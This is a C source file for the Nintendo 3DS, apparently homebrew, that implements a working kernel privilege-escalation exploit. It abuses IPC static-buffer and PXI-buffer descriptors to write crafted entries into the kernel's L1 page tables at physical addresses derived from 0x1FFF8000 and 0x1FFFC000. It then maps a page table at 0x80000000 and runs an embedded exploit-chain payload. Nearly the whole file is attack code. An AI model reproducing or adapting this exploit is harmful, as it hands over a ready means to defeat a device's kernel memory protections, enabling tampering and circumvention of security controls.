#include <string.h>
#include <3ds.h>
#include "MyThread.h"
#include "kernelhaxcode_3ds_bin.h"
#include "../kernelhaxcode_3ds/exploit_chain.h"

#define IS_N3DS                 (*(vu32 *)0x1FF80030 >= 6) // APPMEMTYPE. Hacky but doesn't use APT

#define TRY(expr)       if(R_FAILED(res = (expr))) return res;

void panic(Result res)
{
    (void)res;
    __builtin_trap();
}

static inline void assertSuccess(Result res)
{
    if(R_FAILED(res)) {
        panic(res);
    }
}

Result __sync_init(void);
Result __sync_fini(void);
void __libc_init_array(void);
void __libc_fini_array(void);

void __ctru_exit()
{
    __sync_fini();
    __libc_fini_array();
    svcExitProcess();
}

void initSystem()
{
    __sync_init();
    __libc_init_array();
}

static void receiver(void *p)
{
    Handle *sess = (Handle *)p;
    u32 *sbufs = getThreadStaticBuffers();
    u32 *cmdbuf = getThreadCommandBuffer();
    s32 id;
    static u8 ALIGN(0x1000) actualStaticBuf[0x1000];

    // Here we create a MMU entry, L1 entry mapping a page table (client will set bits 1 and 0 accordingly), to map 0x80000000, on core 0
    // Note: fucks up Luma3DS's kext & rosalina
    sbufs[0] = IPC_Desc_StaticBuffer(0, 0); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[1] = KERNVA2PA(0x1FFF8000) + (MAP_ADDR >> 20) * 4;

    sbufs[2] = IPC_Desc_StaticBuffer(0, 1); // size = 0 because the kernel doesn't care when writing & avoids a va2pa that would lead to a crash
    sbufs[3] = KERNVA2PA(0x1FFFC000) + (MAP_ADDR >> 20) * 4;

    sbufs[4] = IPC_Desc_StaticBuffer(0x1000, 2); // actual static buffer to cause a dcache flush
    sbufs[5] = (u32)actualStaticBuf;

    // Receive
    cmdbuf[0] = 0xFFFF0000;
    svcReplyAndReceive(&id, sess, 1, 0);

    // Reply
    cmdbuf[0] = 0x40;
    cmdbuf[1] = 0xD15EA5E5;
    svcReplyAndReceive(&id, sess, 1, *sess);

    // Close
    svcCloseHandle(*sess);
}

static Result doExploit(void)
{
    Handle client, server;

    Result res = 0;
    u32 buf32 = 0;
    BlobLayout *layout = NULL;

    TRY(svcControlMemory(&buf32, 0x0, 0x0, sizeof(BlobLayout), MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE));
    layout = (BlobLayout *)buf32;

    memset(layout, 0, sizeof(BlobLayout));

    if (layout == NULL) {
        return 0xDEAD1001;
    }

    memcpy(layout->code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
    khc3dsPrepareL2Table(layout);

    TRY(svcCreateSession(&server, &client));

    MyThread t;
    static u8 receiverStack[THREAD_STACK_SIZE];
    TRY(MyThread_Create(&t, receiver, &server, receiverStack, THREAD_STACK_SIZE, 0x18, -2));

    u32 *cmdbuf = getThreadCommandBuffer();
    cmdbuf[0] = 0x10046;
    cmdbuf[1] = 0;
    cmdbuf[2] = IPC_Desc_PXIBuffer(4, 0, false);
    cmdbuf[3] = (u32)layout->l2table | 1; // P=0 Domain=0000 (client), coarse page table
    cmdbuf[4] = IPC_Desc_PXIBuffer(4, 1, false);
    cmdbuf[5] = (u32)layout->l2table | 1; // P=0 Domain=0000 (client), coarse page table
    cmdbuf[6] = IPC_Desc_PXIBuffer(sizeof(BlobLayout), 2, false);
    cmdbuf[7] = (u32)layout; // to cause a dcache flush
    TRY(svcSendSyncRequest(client));

    svcCloseHandle(client);

    return khc3dsRunExploitChain(layout);
}

int main(int argc, char* argv[])
{
    assertSuccess(doExploit());

    return 0;
}
